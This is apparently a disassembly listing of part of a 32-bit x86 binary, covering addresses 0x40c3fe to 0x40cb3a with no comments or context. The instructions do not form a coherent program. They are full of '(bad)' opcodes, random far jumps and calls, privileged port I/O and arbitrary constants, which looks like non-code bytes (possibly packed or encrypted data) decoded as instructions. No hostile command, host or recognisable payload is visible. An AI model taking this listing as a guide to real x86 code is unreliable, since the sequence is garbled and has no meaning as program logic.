  40c3fe:	jp     0x40c3ce
  40c400:	inc    esi
  40c401:	adc    BYTE PTR [esi+edi*2-0x76],bh
  40c405:	in     eax,dx
  40c406:	pop    es
  40c407:	xchg   ecx,eax
  40c408:	popf   
  40c409:	sub    DWORD PTR [eax+ebp*4],ebx
  40c40c:	adc    ecx,DWORD PTR [eax+eax*1+0x5f]
  40c410:	outs   dx,DWORD PTR ds:[esi]
  40c411:	leave  
  40c412:	jl     0x40c3d2
  40c414:	sbb    ah,bl
  40c416:	mov    WORD PTR [edx+0x61],?
  40c419:	pop    esp
  40c41a:	fsubr  QWORD PTR [ebp+0x53]
  40c41d:	adc    BYTE PTR [edx],cl
  40c41f:	xchg   ebx,eax
  40c420:	cld    
  40c421:	enter  0xe8b2,0x33
  40c425:	mov    DWORD PTR [esi-0x619d2720],edx
  40c42b:	xchg   ecx,eax
  40c42c:	stos   BYTE PTR es:[edi],al
  40c42d:	(bad)  
  40c42e:	stos   DWORD PTR es:[edi],eax
  40c42f:	(bad)
  40c432:	pop    ds
  40c433:	xor    BYTE PTR [ebx+0x476d9e8f],0x78
  40c43a:	jecxz  0x40c422
  40c43c:	ins    DWORD PTR es:[edi],dx
  40c43d:	nop
  40c43e:	dec    edx
  40c43f:	push   0x22
  40c441:	mov    ds:0x5c5a6e80,eax
  40c446:	sbb    eax,0xc190d0ed
  40c44b:	out    0xb6,eax
  40c44d:	lds    eax,FWORD PTR [ecx]
  40c44f:	xor    eax,DWORD PTR [ecx-0x55]
  40c452:	pushf  
  40c453:	adc    al,0xc4
  40c455:	popf   
  40c456:	dec    ecx
  40c457:	and    eax,DWORD PTR [ebx+0x56]
  40c45a:	push   edi
  40c45b:	jp     0x40c42d
  40c45d:	jo     0x40c4a7
  40c45f:	ins    DWORD PTR es:[edi],dx
  40c460:	adc    eax,0xffc70097
  40c465:	retf   0xd906
  40c468:	xchg   ebp,eax
  40c469:	je     0x40c41f
  40c46b:	jae    0x40c40b
  40c46d:	or     DWORD PTR [esi-0x60df2bdb],eax
  40c473:	rcr    DWORD PTR [ebx+edx*1],cl
  40c476:	mov    BYTE PTR [ebx],ch
  40c478:	add    ecx,DWORD PTR [ebx-0x60b3cc2c]
  40c47e:	sub    DWORD PTR [edi],0x637df77a
  40c484:	mov    ds:0x8694ac3c,eax
  40c489:	adc    DWORD PTR ds:0x66d6d515,ebx
  40c48f:	repz int3 
  40c491:	inc    ecx
  40c492:	(bad)  
  40c493:	jae    0x40c42a
  40c495:	jo     0x40c4e3
  40c497:	scas   eax,DWORD PTR es:[edi]
  40c498:	xchg   edx,eax
  40c499:	pop    esp
  40c49a:	push   edx
  40c49b:	push   ss
  40c49c:	mov    edx,0x9f1c34b0
  40c4a1:	mov    ds:0x9b051746,al
  40c4a6:	push   eax
  40c4a7:	pop    ds
  40c4a8:	(bad)  
  40c4a9:	sbb    eax,0x6f47aeea
  40c4ae:	cdq    
  40c4af:	into   
  40c4b0:	adc    DWORD PTR [ebx+0x44],edi
  40c4b3:	jecxz  0x40c476
  40c4b5:	aaa    
  40c4b6:	mov    al,BYTE PTR [ebp-0x7957dcda]
  40c4bc:	cs adc bh,al
  40c4bf:	or     edx,DWORD PTR [eax+0x473c9372]
  40c4c5:	xor    edi,DWORD PTR [ebx-0x20]
  40c4c8:	sub    al,0xf8
  40c4ca:	loop   0x40c4bf
  40c4cc:	jnp    0x40c4b7
  40c4ce:	xchg   ebp,eax
  40c4cf:	ja     0x40c482
  40c4d1:	add    al,0x66
  40c4d3:	push   esp
  40c4d4:	mov    bl,BYTE PTR [edi-0x2a147467]
  40c4da:	dec    ecx
  40c4db:	mov    ds:0x92268a45,al
  40c4e0:	mov    dh,0x0
  40c4e2:	(bad)  
  40c4e3:	jnp    0x40c494
  40c4e5:	add    eax,0xf5e09442
  40c4ea:	iret   
  40c4eb:	adc    edi,eax
  40c4ed:	jl     0x40c4bf
  40c4ef:	shl    DWORD PTR [edi-0x5533407],cl
  40c4f5:	scas   eax,DWORD PTR es:[edi]
  40c4f6:	sub    al,0xec
  40c4f8:	pop    edi
  40c4f9:	cmp    al,0x43
  40c4fb:	data16 jo 0x40c496
  40c4fe:	scas   eax,DWORD PTR es:[edi]
  40c4ff:	mov    cl,0x9d
  40c501:	jge    0x40c511
  40c503:	cmp    BYTE PTR [edx],bh
  40c505:	rcr    dl,0xe8
  40c508:	cdq    
  40c509:	jmp    0xb01b:0x3a2fad3b
  40c510:	mov    ?,WORD PTR [eax-0x313241ee]
  40c516:	or     esp,DWORD PTR [ebp+0x26]
  40c519:	js     0x40c4c0
  40c51b:	mov    dh,0xdc
  40c51d:	sub    eax,esp
  40c51f:	daa    
  40c520:	js     0x40c515
  40c522:	sub    eax,0x28147a96
  40c527:	sub    eax,0xcca13f95
  40c52c:	cmp    DWORD PTR [ecx-0x57],edi
  40c52f:	push   0x336338e1
  40c534:	inc    edx
  40c535:	jno    0x40c538
  40c537:	call   0x6e613c3e
  40c53c:	add    eax,0xd5a284fd
  40c541:	stos   BYTE PTR es:[edi],al
  40c542:	aam    0x2f
  40c544:	dec    ebx
  40c545:	push   eax
  40c546:	jb     0x40c55b
  40c548:	push   0xd4ade304
  40c54d:	mov    ebp,0x85b6566d
  40c552:	pop    es
  40c553:	dec    esi
  40c554:	loope  0x40c4f1
  40c556:	mov    ecx,0xc00401f5
  40c55b:	adc    edi,eax
  40c55d:	sub    bl,bh
  40c55f:	push   es
  40c560:	aam    0xb4
  40c562:	mov    edi,0x1e304f13
  40c567:	sub    esi,edi
  40c569:	pushf  
  40c56a:	pop    esi
  40c56b:	cli    
  40c56c:	adc    eax,0xfdf74019
  40c571:	mov    ebp,0x8e5f2060
  40c576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c577:	mov    esi,0x7455629d
  40c57c:	int    0xeb
  40c57e:	es mov edi,edi
  40c581:	mov    fs,esp
  40c583:	adc    bl,0x19
  40c586:	stos   DWORD PTR es:[edi],eax
  40c587:	or     DWORD PTR [eax+esi*8+0x2f723ace],0x6b
  40c58f:	jl     0x40c570
  40c591:	lods   eax,DWORD PTR ds:[esi]
  40c592:	out    dx,al
  40c593:	add    cl,dl
  40c595:	sub    al,0xb9
  40c597:	add    BYTE PTR [ebx+0x16],al
  40c59a:	sbb    DWORD PTR [eax-0x68],ecx
  40c59d:	mov    cl,0xe8
  40c59f:	in     al,0x84
  40c5a1:	into   
  40c5a2:	outs   dx,BYTE PTR ds:[esi]
  40c5a3:	test   eax,0x44753310
  40c5a8:	ret    
  40c5a9:	push   edi
  40c5aa:	sub    ebp,edi
  40c5ac:	or     DWORD PTR [eax],ebp
  40c5ae:	pop    esp
  40c5af:	sub    DWORD PTR [ecx-0x55],ecx
  40c5b2:	pusha  
  40c5b3:	clc    
  40c5b4:	in     al,dx
  40c5b5:	or     BYTE PTR [edx],cl
  40c5b7:	jmp    0xef02:0xed6849f9
  40c5be:	pusha  
  40c5bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5c0:	mov    ebx,0xb90677e4
  40c5c5:	or     bl,BYTE PTR [ecx]
  40c5c7:	cmp    DWORD PTR [esi],0xffffffd9
  40c5ca:	push   ecx
  40c5cb:	adc    bl,bh
  40c5cd:	mov    edi,DWORD PTR [edi+0x51]
  40c5d0:	dec    esp
  40c5d1:	mov    DWORD PTR [edi+eiz*8],ebp
  40c5d4:	test   eax,0xd17dd4f8
  40c5d9:	cmp    eax,0x13dfd464
  40c5de:	pop    edx
  40c5df:	push   cs
  40c5e0:	retf   0x6ed6
  40c5e3:	divps  xmm2,XMMWORD PTR [ecx+0x42]
  40c5e7:	in     al,0xe7
  40c5e9:	mov    al,0x7
  40c5eb:	(bad)  
  40c5ec:	sti    
  40c5ed:	jne    0x40c63a
  40c5ef:	(bad)  
  40c5f0:	add    ebp,ebp
  40c5f2:	retf   0x8a6e
  40c5f5:	punpcklwd mm2,DWORD PTR [ecx+0x6e516dff]
  40c5fc:	mov    edi,0xc4813fe7
  40c601:	fadd   DWORD PTR [eax]
  40c603:	in     eax,dx
  40c604:	hlt    
  40c605:	je     0x40c5c5
  40c607:	dec    esi
  40c608:	mov    edx,0xde37d148
  40c60d:	das    
  40c60e:	pop    ss
  40c60f:	mov    DWORD PTR [ebx+ebp*2+0x1af14c8e],ecx
  40c616:	push   esp
  40c617:	mov    bl,0x84
  40c619:	sbb    al,0xb9
  40c61b:	push   edx
  40c61c:	ss es imul ecx,eax,0x45
  40c621:	jl     0x40c5a7
  40c623:	mov    ds:0xfabc0c27,al
  40c628:	push   edi
  40c629:	(bad)  
  40c62a:	aad    0x3c
  40c62c:	retf   0x8012
  40c62f:	sub    BYTE PTR [ebp-0x71],0xd4
  40c633:	and    bl,bh
  40c635:	pushf  
  40c636:	clc    
  40c637:	js     0x40c662
  40c639:	std    
  40c63a:	jno    0x40c65a
  40c63c:	aas    
  40c63d:	pop    esp
  40c63e:	call   0xa38f:0x1cba9c2b
  40c645:	out    0xde,al
  40c647:	adc    al,0x93
  40c649:	mov    ?,WORD PTR [edx+0x338b9b58]
  40c64f:	push   cs
  40c650:	jae    0x40c667
  40c652:	sbb    BYTE PTR [ebx],bh
  40c654:	aad    0x6
  40c656:	fist   DWORD PTR ds:0x1e5447b4
  40c65c:	and    dh,BYTE PTR [esi+0x3f]
  40c65f:	mov    bl,BYTE PTR [edx-0x1e]
  40c662:	scas   eax,DWORD PTR es:[edi]
  40c663:	and    BYTE PTR [ecx-0x11],bh
  40c666:	or     al,0x83
  40c668:	xchg   esi,eax
  40c669:	jg     0x40c674
  40c66b:	and    al,0xf6
  40c66d:	test   ecx,0x49ca2945
  40c673:	inc    edx
  40c674:	pop    ds
  40c675:	xchg   ecx,eax
  40c676:	int    0x81
  40c678:	ss (bad) 
  40c67a:	cmp    edi,edx
  40c67c:	jbe    0x40c678
  40c67e:	cmp    al,cl
  40c680:	jmp    0x8b97:0xab9a4618
  40c687:	std    
  40c688:	inc    ebp
  40c689:	mov    eax,ds:0x8a418fb9
  40c68e:	xor    bh,dh
  40c690:	rcl    DWORD PTR [ebp-0x7f],1
  40c693:	rcl    WORD PTR [ecx],1
  40c696:	sbb    ebx,DWORD PTR [ebp+0x7942a08c]
  40c69c:	push   cs
  40c69d:	aam    0x15
  40c69f:	outs   dx,DWORD PTR ds:[esi]
  40c6a0:	or     DWORD PTR [edx+edx*4+0x6e],ebx
  40c6a4:	or     al,0xee
  40c6a6:	push   esp
  40c6a7:	xchg   edx,eax
  40c6a8:	iret   
  40c6a9:	dec    edx
  40c6aa:	xchg   DWORD PTR [esi],ebx
  40c6ac:	inc    ebx
  40c6ad:	loopne 0x40c653
  40c6af:	repnz lds edx,FWORD PTR ds:0xf7c0d587
  40c6b6:	repz and dl,BYTE PTR [ebp-0x4f008a2a]
  40c6bd:	cld    
  40c6be:	sub    dl,ch
  40c6c0:	(bad)  
  40c6c1:	adc    al,0x91
  40c6c3:	gs ins DWORD PTR es:[edi],dx
  40c6c5:	add    edx,edx
  40c6c7:	dec    edx
  40c6c8:	lahf   
  40c6c9:	dec    ecx
  40c6ca:	out    0xaf,eax
  40c6cc:	cdq    
  40c6cd:	loope  0x40c72d
  40c6cf:	ret    0x9322
  40c6d2:	loop   0x40c715
  40c6d4:	mov    ah,0x61
  40c6d6:	cmp    edi,DWORD PTR [edi-0x7a22c4a9]
  40c6dc:	aaa    
  40c6dd:	sub    eax,DWORD PTR [ebp+0x1]
  40c6e0:	shl    esi,1
  40c6e2:	xchg   esi,eax
  40c6e3:	adc    al,0xda
  40c6e5:	sub    al,0xd7
  40c6e7:	test   BYTE PTR [ebp-0x12323cfd],ah
  40c6ed:	in     eax,dx
  40c6ee:	rcl    BYTE PTR [ebp+0x7b],0xe9
  40c6f2:	in     al,dx
  40c6f3:	inc    eax
  40c6f4:	sbb    eax,0x46c005f8
  40c6f9:	adc    ch,bh
  40c6fb:	xor    bl,0x64
  40c6fe:	inc    ebp
  40c6ff:	pop    esp
  40c700:	lahf   
  40c701:	(bad)  
  40c702:	lea    edi,[esi+0x660af5c0]
  40c708:	xor    al,0x19
  40c70a:	sub    BYTE PTR [ebp+0x4285c6bb],ch
  40c710:	lods   eax,DWORD PTR ds:[esi]
  40c711:	adc    ebx,DWORD PTR [esi+eax*2]
  40c714:	push   cs
  40c715:	mov    bl,0x94
  40c717:	ins    DWORD PTR es:[edi],dx
  40c718:	pushf  
  40c719:	aad    0xdf
  40c71b:	adc    al,0x74
  40c71d:	add    BYTE PTR [ecx],al
  40c71f:	(bad)  
  40c720:	and    al,0x71
  40c722:	push   edx
  40c723:	int3   
  40c724:	or     ah,BYTE PTR [edx]
  40c726:	jb     0x40c6d8
  40c728:	jge    0x40c737
  40c72a:	push   ecx
  40c72b:	inc    edx
  40c72c:	sub    cl,BYTE PTR [edi+eiz*8-0x5b]
  40c730:	xlat   BYTE PTR ds:[ebx]
  40c731:	and    ax,0xe665
  40c735:	push   esi
  40c736:	add    bl,ah
  40c738:	cs (bad) 
  40c73a:	stos   DWORD PTR es:[edi],eax
  40c73b:	and    al,0x12
  40c73d:	scas   eax,DWORD PTR es:[edi]
  40c73e:	lahf   
  40c73f:	xchg   ebx,eax
  40c740:	mov    cl,BYTE PTR [ebx+0x12af6c9f]
  40c746:	outs   dx,DWORD PTR ds:[esi]
  40c747:	into   
  40c748:	out    0xdd,al
  40c74a:	sub    al,0xfb
  40c74c:	mov    dh,0x93
  40c74e:	ins    BYTE PTR es:[edi],dx
  40c74f:	je     0x40c712
  40c751:	xchg   edi,eax
  40c752:	mov    edi,0xba225fa
  40c757:	sub    al,0xa5
  40c759:	in     al,0x2e
  40c75b:	pop    es
  40c75c:	sub    edx,DWORD PTR [ebp-0x47]
  40c75f:	push   0x1ac193b5
  40c764:	adc    DWORD PTR [edx-0xc1a9821],esp
  40c76a:	ins    BYTE PTR es:[edi],dx
  40c76b:	hlt    
  40c76c:	scas   al,BYTE PTR es:[edi]
  40c76d:	mov    esi,DWORD PTR [eax-0x40b46916]
  40c773:	add    al,0xdc
  40c775:	jns    0x40c7d1
  40c777:	fisttp DWORD PTR [eax]
  40c779:	retf   0xc0a6
  40c77c:	dec    esi
  40c77d:	dec    ebp
  40c77e:	add    ch,dh
  40c780:	cmp    ch,dl
  40c782:	xchg   esi,eax
  40c783:	shl    esp,1
  40c785:	mov    al,0x6d
  40c787:	inc    edi
  40c788:	imul   esp,DWORD PTR [ebp-0x3a577720],0xffffffeb
  40c78f:	sbb    al,0xd2
  40c791:	lahf   
  40c792:	dec    edx
  40c793:	sub    bl,bl
  40c795:	or     bh,BYTE PTR [ebp+0x29678238]
  40c79b:	mov    ah,BYTE PTR [eax+0xd]
  40c79e:	jecxz  0x40c7a6
  40c7a0:	je     0x40c777
  40c7a2:	mov    ebx,0xbbd4dc02
  40c7a7:	pop    eax
  40c7a8:	mov    edi,0xaf6b5568
  40c7ad:	adc    DWORD PTR ds:0x449b0e7,0x8c69c673
  40c7b7:	mov    cl,0x2e
  40c7b9:	sbb    BYTE PTR [edi-0x37],bh
  40c7bc:	and    eax,0x36c07832
  40c7c1:	out    dx,al
  40c7c2:	add    eax,0xf8ec9a54
  40c7c7:	dec    edx
  40c7c8:	pop    ebp
  40c7c9:	pop    es
  40c7ca:	pop    esi
  40c7cb:	lods   al,BYTE PTR ds:[esi]
  40c7cc:	sub    dh,dh
  40c7ce:	into   
  40c7cf:	inc    ebx
  40c7d0:	pusha  
  40c7d1:	data16 mov ds:0x2fb705e2,al
  40c7d7:	jecxz  0x40c7d9
  40c7d9:	ds inc ebp
  40c7db:	dec    edx
  40c7dc:	frstor [edi+0x283923e5]
  40c7e2:	cmp    eax,0x3e342c3
  40c7e7:	add    al,0xe2
  40c7e9:	cs into 
  40c7eb:	jne    0x40c7e1
  40c7ed:	leave  
  40c7ee:	add    al,0x77
  40c7f0:	cmp    ebx,esi
  40c7f2:	jp     0x40c7f6
  40c7f4:	fstp   QWORD PTR [ebx+eax*2+0x381845ce]
  40c7fb:	mov    al,ds:0xbffb59ba
  40c800:	push   ecx
  40c801:	pop    ebp
  40c802:	outs   dx,BYTE PTR ds:[esi]
  40c803:	or     bh,BYTE PTR [ebx]
  40c805:	jae    0x40c84a
  40c807:	dec    eax
  40c808:	and    DWORD PTR [eax-0x4cea7245],ebp
  40c80e:	or     BYTE PTR [edx+0x335e9ee],ah
  40c814:	repnz sub eax,DWORD PTR [ebp+0x1c]
  40c818:	xlat   BYTE PTR ds:[ebx]
  40c819:	add    ecx,DWORD PTR [ebx+eax*1+0x17]
  40c81d:	pushf  
  40c81e:	imul   esi,DWORD PTR [ecx-0x1f],0x3b
  40c822:	xchg   edi,eax
  40c823:	out    dx,eax
  40c824:	and    ebp,DWORD PTR [ebp-0x5f]
  40c827:	add    al,0xa3
  40c829:	mov    edi,0x93a1bc0a
  40c82e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c82f:	adc    al,0x59
  40c831:	mov    dh,0xf1
  40c833:	mov    WORD PTR [eax],cs
  40c835:	lahf   
  40c836:	iret   
  40c837:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c838:	xchg   esp,eax
  40c839:	call   0xd2e83285
  40c83e:	jbe    0x40c861
  40c840:	clc    
  40c841:	sbb    ebp,DWORD PTR [edi+ecx*4]
  40c844:	inc    ecx
  40c845:	dec    edx
  40c846:	aas    
  40c847:	ror    BYTE PTR ds:0x15a8e243,1
  40c84d:	mov    dh,0x92
  40c84f:	and    dl,al
  40c851:	adc    DWORD PTR [edi+esi*4+0x3c],ebx
  40c855:	into   
  40c856:	clc    
  40c857:	push   esp
  40c858:	mov    ch,al
  40c85a:	mov    ebp,0x735c1706
  40c85f:	dec    eax
  40c860:	ja     0x40c876
  40c862:	xchg   ecx,eax
  40c863:	les    ebx,FWORD PTR [ebp-0x47d4cb1e]
  40c869:	jg     0x40c82a
  40c86b:	dec    edi
  40c86c:	fdivr  st,st(5)
  40c86e:	jbe    0x40c803
  40c870:	sub    ah,BYTE PTR [esi+0x6e]
  40c873:	xchg   esp,eax
  40c874:	dec    eax
  40c875:	or     DWORD PTR [edx-0x68dac478],esp
  40c87b:	test   eax,0x8a399231
  40c880:	push   ebx
  40c881:	addr16 ja 0x40c842
  40c884:	stos   BYTE PTR es:[edi],al
  40c885:	mov    eax,ds:0xd06b3a95
  40c88a:	cvttps2pi mm4,QWORD PTR ds:[edi]
  40c88e:	sub    ebx,DWORD PTR [esi-0xa]
  40c891:	in     al,0x1e
  40c893:	jo     0x40c8f6
  40c895:	jle    0x40c8b8
  40c897:	fnstsw WORD PTR [eax]
  40c899:	add    ch,BYTE PTR [ebx]
  40c89b:	pop    edi
  40c89c:	ins    DWORD PTR es:[edi],dx
  40c89d:	sub    al,BYTE PTR ds:0xa7f36f66
  40c8a3:	sbb    al,bl
  40c8a5:	pop    edi
  40c8a6:	jg     0x40c896
  40c8a8:	xor    al,0xc
  40c8aa:	jl     0x40c86f
  40c8ac:	mov    ds:0x8d14aaa3,al
  40c8b1:	cmp    al,0x50
  40c8b3:	stos   BYTE PTR es:[edi],al
  40c8b4:	add    al,0xf0
  40c8b6:	(bad)  
  40c8b7:	cdq    
  40c8b8:	test   BYTE PTR [eax],dh
  40c8ba:	sub    ecx,DWORD PTR [eax]
  40c8bc:	xor    ecx,ecx
  40c8be:	int    0x63
  40c8c0:	test   eax,edi
  40c8c2:	push   0xffffffa4
  40c8c4:	out    dx,al
  40c8c5:	cdq    
  40c8c6:	push   cs
  40c8c7:	xor    edx,eax
  40c8c9:	or     al,0xa8
  40c8cb:	add    ecx,DWORD PTR [ebx+0x7a8ae058]
  40c8d1:	mov    ebx,0xb7e0abcd
  40c8d6:	jle    0x40c90b
  40c8d8:	repnz (bad) 
  40c8da:	cmp    cl,bl
  40c8dc:	ror    DWORD PTR [eax],0x49
  40c8df:	inc    ebx
  40c8e0:	int    0xcb
  40c8e2:	gs jnp 0x40c8cd
  40c8e5:	mov    eax,0x1d3d8c90
  40c8ea:	outs   dx,BYTE PTR ds:[esi]
  40c8eb:	mov    ecx,DWORD PTR [edi-0x6a]
  40c8ee:	in     al,dx
  40c8ef:	ret    
  40c8f0:	fisttp DWORD PTR [edx+0x3bd79379]
  40c8f6:	jae    0x40c93b
  40c8f8:	xchg   edi,eax
  40c8f9:	enter  0x36d7,0xa2
  40c8fd:	xor    BYTE PTR [ebx],bl
  40c8ff:	jg     0x769359ac
  40c905:	gs xchg edi,eax
  40c907:	lods   eax,DWORD PTR ds:[esi]
  40c908:	scas   eax,DWORD PTR es:[edi]
  40c909:	nop
  40c90a:	sub    DWORD PTR [ecx],esi
  40c90c:	test   al,0x4
  40c90e:	sub    edx,DWORD PTR [ebx+0x5f190e5a]
  40c914:	mov    dl,0xfb
  40c916:	std    
  40c917:	xchg   DWORD PTR [ebx],esi
  40c919:	into   
  40c91a:	ror    DWORD PTR [edi-0x69],cl
  40c91d:	hlt    
  40c91e:	inc    esi
  40c91f:	mov    ah,0xe0
  40c921:	fld    TBYTE PTR [esi]
  40c923:	push   esp
  40c924:	sbb    dh,BYTE PTR [esi+0x64d2d18a]
  40c92a:	fimul  DWORD PTR [ebx+0x56]
  40c92d:	bound  esi,QWORD PTR [ecx]
  40c92f:	xchg   DWORD PTR [eax-0x3c],ecx
  40c932:	or     dl,BYTE PTR [edx-0x1ac3aa71]
  40c938:	das    
  40c939:	add    eax,0x804d9481
  40c93e:	inc    edi
  40c93f:	xor    eax,0x36c7e865
  40c944:	enter  0x1c63,0x2e
  40c948:	cmp    eax,0x518d7764
  40c94d:	gs jne 0x40c991
  40c950:	nop
  40c951:	lock add DWORD PTR [eax],0x6f80a5dc
  40c958:	mov    esi,0xab75baec
  40c95d:	mov    edi,0xfc45861d
  40c962:	xor    dh,BYTE PTR [edi]
  40c964:	js     0x40c98e
  40c966:	bswap  ebx
  40c968:	sub    DWORD PTR [edi-0x3e50b6e2],esi
  40c96e:	push   0xcb91ee25
  40c973:	in     al,dx
  40c974:	cdq    
  40c975:	sub    ch,BYTE PTR [ebp-0x644101a0]
  40c97b:	je     0x40c90d
  40c97d:	cdq    
  40c97e:	xchg   esp,eax
  40c97f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c980:	imul   ecx,eax,0xffffff8f
  40c983:	mov    BYTE PTR [eax-0x66],bl
  40c986:	jns    0x40c98c
  40c988:	xor    cl,BYTE PTR [bp-0x406d]
  40c98d:	pop    ds
  40c98e:	mov    ebx,edx
  40c990:	inc    ebx
  40c991:	push   eax
  40c992:	pop    es
  40c993:	(bad)  
  40c994:	pop    ss
  40c995:	xchg   esp,eax
  40c996:	jle    0x40c95d
  40c998:	(bad)
  40c99c:	adc    DWORD PTR [ecx],0xffffffe4
  40c99f:	scas   eax,DWORD PTR es:[edi]
  40c9a0:	jae    0x40ca0a
  40c9a2:	adc    bh,BYTE PTR [edx-0x7915be8d]
  40c9a8:	ret    
  40c9a9:	jno    0x40c93e
  40c9ab:	jl     0x40ca13
  40c9ad:	pop    ebp
  40c9ae:	dec    ebx
  40c9af:	fcomip st,st(1)
  40c9b1:	dec    edi
  40c9b2:	lods   al,BYTE PTR ds:[esi]
  40c9b3:	daa    
  40c9b4:	and    dl,BYTE PTR [edi]
  40c9b6:	hlt    
  40c9b7:	or     cl,bh
  40c9b9:	sti    
  40c9ba:	dec    edi
  40c9bb:	adc    esp,DWORD PTR [ebx+0x749e59d6]
  40c9c1:	pop    esi
  40c9c2:	inc    esp
  40c9c3:	cmp    eax,0xadf824ab
  40c9c8:	out    0x43,eax
  40c9ca:	mov    ?,WORD PTR [eax-0xbeb54ba]
  40c9d0:	cld    
  40c9d1:	mov    edx,0x782b9077
  40c9d6:	call   0xa241:0x4f33a876
  40c9dd:	xchg   esi,eax
  40c9de:	dec    edi
  40c9df:	mov    BYTE PTR ds:0x4751b88d,ah
  40c9e5:	push   esp
  40c9e6:	scas   eax,DWORD PTR es:[edi]
  40c9e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9e8:	cmc    
  40c9e9:	sub    DWORD PTR [esi],eax
  40c9eb:	xchg   esp,eax
  40c9ec:	ror    DWORD PTR [ebx+edi*1-0x37],cl
  40c9f0:	push   0xffffffcd
  40c9f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9f3:	outs   dx,DWORD PTR ds:[esi]
  40c9f4:	lahf   
  40c9f5:	jl     0x40ca3b
  40c9f7:	mov    bh,0x5e
  40c9f9:	mov    dl,0x52
  40c9fb:	stc    
  40c9fc:	bound  edi,QWORD PTR [esi]
  40c9fe:	xor    al,BYTE PTR [ecx+0x1e]
  40ca01:	push   eax
  40ca02:	and    ah,dl
  40ca04:	sbb    BYTE PTR [ebp-0x1f],cl
  40ca07:	push   ax
  40ca09:	mov    dl,0xe9
  40ca0b:	fs sbb eax,0x2063ab6
  40ca11:	sub    ch,bh
  40ca13:	jmp    0x40ca90
  40ca15:	jp     0x40ca95
  40ca17:	std    
  40ca18:	jns    0x40ca5e
  40ca1a:	fcmovne st,st(4)
  40ca1c:	test   BYTE PTR [edi-0x46],dh
  40ca1f:	cs enter 0x6811,0x37
  40ca24:	(bad)  
  40ca25:	sbb    eax,0x7494aa9c
  40ca2a:	pop    esp
  40ca2b:	stos   BYTE PTR es:[edi],al
  40ca2c:	mov    al,ds:0xb6ba5962
  40ca31:	xchg   edi,eax
  40ca32:	mov    eax,ds:0x3588ae3e
  40ca37:	sar    DWORD PTR [edx+0x60],0x5
  40ca3b:	scas   eax,DWORD PTR es:[edi]
  40ca3c:	(bad)
  40ca3f:	sbb    al,0xce
  40ca41:	int3   
  40ca42:	adc    DWORD PTR [edx-0x15],ebp
  40ca45:	push   ss
  40ca46:	fbstp  TBYTE PTR [esi-0x18]
  40ca49:	or     DWORD PTR [edi+0x173e6a20],0x3249ff71
  40ca53:	pushf  
  40ca54:	xchg   esp,eax
  40ca55:	pop    eax
  40ca56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca57:	rcr    BYTE PTR [edi],1
  40ca59:	imul   ebx,DWORD PTR [ebp+0xb],0x2d
  40ca5d:	push   0xd04924cc
  40ca62:	pop    esi
  40ca63:	test   eax,0xcd946fa9
  40ca68:	pop    es
  40ca69:	cwde   
  40ca6a:	cmc    
  40ca6b:	inc    eax
  40ca6c:	jbe    0x40c9f2
  40ca6e:	je     0x40caa5
  40ca70:	loopne 0x40ca6d
  40ca72:	cmp    cl,BYTE PTR [edx+0x7e]
  40ca75:	sub    edx,ecx
  40ca77:	inc    esp
  40ca78:	or     eax,0xc5286c7c
  40ca7d:	test   DWORD PTR [edx-0x24],edi
  40ca80:	mov    edi,0x4a1b7d1d
  40ca85:	(bad)  
  40ca86:	mov    dl,0x28
  40ca88:	pop    ss
  40ca89:	das    
  40ca8a:	inc    ebp
  40ca8b:	dec    edi
  40ca8c:	sub    esp,ebx
  40ca8e:	addr16 lahf 
  40ca90:	xchg   edx,eax
  40ca91:	or     al,BYTE PTR [edx]
  40ca93:	cdq    
  40ca94:	rol    DWORD PTR [edx+0x503a9a5a],1
  40ca9a:	(bad)  
  40ca9b:	jmp    0x40cad5
  40ca9d:	dec    edi
  40ca9e:	call   0xbd08:0x2f940c32
  40caa5:	pop    eax
  40caa6:	sub    DWORD PTR [edx-0x646872a8],edx
  40caac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40caad:	nop
  40caae:	pop    ss
  40caaf:	pop    es
  40cab0:	sub    eax,0x43b59fc5
  40cab5:	retf   0xd9d3
  40cab8:	cwde   
  40cab9:	pop    eax
  40caba:	fcmove st,st(1)
  40cabc:	rcr    BYTE PTR [ebp+0x6f],0x70
  40cac0:	inc    ecx
  40cac1:	xor    ah,BYTE PTR [edi]
  40cac3:	pop    ebx
  40cac4:	mov    bh,0x54
  40cac6:	std    
  40cac7:	(bad)  
  40cac8:	push   cs
  40cac9:	push   0x26
  40cacb:	dec    esi
  40cacc:	xchg   esi,eax
  40cacd:	sbb    cl,al
  40cacf:	jne    0x40cb23
  40cad1:	xchg   esp,eax
  40cad2:	retf   0x2ce8
  40cad5:	jns    0x40ca5f
  40cad7:	mov    al,ds:0xa4c14b20
  40cadc:	stos   BYTE PTR es:[edi],al
  40cadd:	xor    eax,0xe242027
  40cae2:	clc    
  40cae3:	cmp    edx,edx
  40cae5:	cmp    ah,ch
  40cae7:	and    eax,0xa2d26c2
  40caec:	mov    eax,ds:0x598b88c1
  40caf1:	fs push es
  40caf3:	sub    bh,BYTE PTR [ebp+0x22]
  40caf6:	or     dh,cl
  40caf8:	scas   eax,DWORD PTR es:[edi]
  40caf9:	sahf   
  40cafa:	pop    eax
  40cafb:	add    eax,0x5a13f89f
  40cb00:	xchg   BYTE PTR [edx+ecx*8+0x2b],cl
  40cb04:	inc    eax
  40cb05:	xor    DWORD PTR [eax-0x26],0x760ffbae
  40cb0c:	(bad)  
  40cb0d:	ins    BYTE PTR es:[edi],dx
  40cb0e:	dec    ecx
  40cb0f:	pop    ss
  40cb10:	lods   eax,DWORD PTR ds:[esi]
  40cb11:	adc    DWORD PTR [ecx+0x10bdf482],edi
  40cb17:	jmp    0x10b3:0xb28b
  40cb1d:	or     BYTE PTR [ecx-0xd],ah
  40cb20:	fmul   QWORD PTR [ebp-0x3fa6d363]
  40cb26:	fwait
  40cb27:	ret    0x29d
  40cb2a:	aas    
  40cb2b:	in     eax,0xd4
  40cb2d:	addr16 inc edx
  40cb2f:	pop    eax
  40cb30:	sub    BYTE PTR [eax],0x8d
  40cb33:	not    BYTE PTR [ebx-0x79]
  40cb36:	retf   0x1ee8
  40cb39:	stos   BYTE PTR es:[edi],al
  40cb3a:	jbe    0x40cb38
